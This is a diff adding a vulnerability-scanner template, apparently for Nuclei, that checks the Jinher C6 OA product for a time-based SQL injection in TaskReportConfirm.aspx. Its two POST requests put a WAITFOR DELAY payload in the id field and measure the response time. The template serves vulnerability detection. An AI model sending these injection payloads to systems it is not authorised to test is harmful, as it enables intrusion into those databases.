@@ -1,0 +1,56 @@
+id: poc-yaml-jinher-taskreportconfirm-aspx-sqli
+info:
+  name: "金和C6 TaskReportConfirm.aspx SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和OA
+  metadata:
+    vendor: "金和OA"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "check-page"
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - id: sqli-check
+    raw:
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/TaskReportConfirm.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        id=3'WAITFOR DELAY'0:0:5'--
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/TaskReportConfirm.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        id=3'WAITFOR DELAY'0:0:8'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "汇报确认"
+          - "同时通知任务查看人"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
